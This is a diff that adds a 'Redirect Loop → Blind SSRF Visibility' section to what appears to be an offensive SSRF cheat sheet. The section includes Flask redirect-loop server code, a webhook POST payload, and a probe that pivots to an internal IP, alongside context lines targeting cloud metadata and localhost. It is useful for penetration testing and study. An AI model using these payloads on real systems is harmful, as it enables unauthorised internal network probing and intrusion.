@@ -281,6 +281,62 @@ https://target.com/redirect?url=http://169.254.169.254/
 https://target.com/oauth/callback?redirect_uri=http://127.0.0.1/
 ```
 
+### Redirect Loop → Blind SSRF Visibility (2025 Technique)
+
+**Concept:** Exploit server-side HTTP client behavior during infinite redirect loops to make blind SSRF observable. Discovered by [@shubs](https://x.com/infosec_au) - PortSwigger Top 10 2025, #3.
+
+**The Attack:**
+1. Set up a URL that triggers an infinite redirect loop pointing back to itself
+2. Feed it to a blind SSRF vulnerability
+3. Server makes N redirects until it hits the redirect limit
+4. **Key insight:** The error message or response behavior leaks info about what happened during the loop
+
+```python
+# Setup on your server: infinite redirect loop
+from flask import Flask, redirect, request
+app = Flask(__name__)
+
+@app.route('/loop')
+def loop():
+    # Redirect back to itself (infinite loop)
+    return redirect(request.url, code=302)
+```
+
+```bash
+# Feed loop URL to blind SSRF
+POST /api/webhook
+Content-Type: application/json
+
+{"url": "https://your-server.com/loop"}
+
+# Server follows redirects until limit hit
+# Error message may reveal: 
+# - Number of redirects followed
+# - Last URL tried
+# - Internal IPs contacted during chain
+```
+
+**Why it works:** HTTP clients often reveal redirect chain info in errors. By controlling the loop start/end, you can probe internal networks:
+
+```python
+# Probe variant: redirect to internal IP after N hops
+count = 0
+@app.route('/probe')
+def probe():
+    global count
+    count += 1
+    if count < 5:
+        return redirect(f"https://your-server.com/probe", 302)
+    else:
+        count = 0
+        return redirect("http://192.168.1.1/", 302)  # Internal target
+```
+
+**Detection signals:**
+- Different error messages for "too many redirects" vs "connection refused"
+- Response timing differences (probed host exists = longer timeout)
+- Callback count on your server reveals how many redirects the client followed
+
 ---
 
 ## Protocol/Scheme Bypasses
